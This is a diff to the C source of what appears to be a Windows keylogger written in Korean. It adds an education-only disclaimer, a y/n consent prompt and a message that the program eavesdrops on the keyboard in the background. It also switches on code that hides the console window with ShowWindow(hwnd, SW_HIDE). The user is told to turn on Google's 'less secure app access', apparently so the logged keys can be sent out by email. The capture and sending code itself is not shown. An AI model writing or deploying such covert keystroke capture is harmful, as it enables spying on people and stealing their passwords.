@@ -47,10 +47,33 @@ int main()
 }
 
 void user() {
+    
     printf("======================*****키로거er*****======================\n");
     printf("by KyuBo Shim\n");
     Sleep(2000);
-    printf("사용 전 구글 계정 설정을 꼭 변경해주세요!!\n");
+    printf("@@@ 본 프로그램은 교육을 목적으로 만든 프로그램으로 악의적으로 사용할시 형사처벌을 받으실수 있습니다. @@@\n");
+    printf("@@@ 꼭 본인 컴퓨터에 하셔야 해요!!ㅠㅠ @@@\n");
+    Sleep(2000);
+    char agree;
+    while (1) {
+        agree = '\0';
+        printf("동의하셨나요? (y/n) >> ");
+        scanf_s("%c", &agree, sizeof(agree));
+        if (agree == 'n' || agree == 'N') {
+            printf("그럼 종료합니다.\n");
+            exit(0);
+        }
+        else if (agree == 'y' || agree == 'Y') {
+            break;
+        }
+        else {
+            printf("잘못된 응답입니다.\n");
+            exit(0);
+        }
+    }
+    printf("0. 이 프로그램을 실행시킨 컴퓨터의 키보드를 도청합니다 :)\n");
+    printf("  설정 완료 시 자동으로 백그라운드에서 실행되기 떄문에 종료하려면 작업관리자를 이용해주세요!\n");
+    printf("1. 사용 전 구글 계정 설정을 꼭 변경해주세요!!\n");
     printf("구글 로그인 --> Google 계정 --> 보안 --> 보안수준이 낮은 엑세스 --> 사용\n");
     Sleep(1000);
 }
@@ -69,6 +92,6 @@ void console() {    // testing console
     Sleep(1000);
     printf("시작!!");
     Sleep(500);
-    /*HWND hwnd = GetForegroundWindow();
-    ShowWindow(hwnd, SW_HIDE);*/
+    HWND hwnd = GetForegroundWindow();
+    ShowWindow(hwnd, SW_HIDE);
 }
